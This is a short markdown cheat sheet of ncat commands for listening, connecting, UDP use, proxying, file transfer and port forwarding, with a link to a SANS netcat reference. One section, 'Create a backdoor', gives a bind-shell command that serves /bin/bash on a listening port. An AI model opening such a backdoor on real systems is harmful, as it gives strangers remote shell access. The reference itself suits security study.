## ncat

### Listen to inbound connections
- ncat -l 8080

### Connect to remote system
- ncat [ip] [port]

### Listen to inbound connections UDP ports
- ncat -l -u [port]
  - check netstat -tunlp | grep [port]
  
### Connect to remote system UDP
- ncat -v -u [ip] [port]

### NC as a proxy
- ncat -l port1 | ncat [ip] [port2]
  - Now all the connections coming to our server on port [port1] will be automatically redirected to [ip] server on port [port2]
  
### Copying Files using nc/ncat
- ncat -l  [port] > file.txt
- ncat [ip] [port] --send-only < data.txt

### Force server to stay up using -k option in ncat
- ncat -l -k [port]

### Set Connection timeouts
- ncat -w [time] [ip] [port]

### Create a backdoor
- ncat -l [port] -e /bin/bash
- ncat [ip] [port]

### Port forwarding via ncat
- ncat -u -l  [port1] -c  'ncat -u -l [port2]'
  - Now all the connections for port [port1] will be forwarded to port [port2]

## nc

cheatsheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
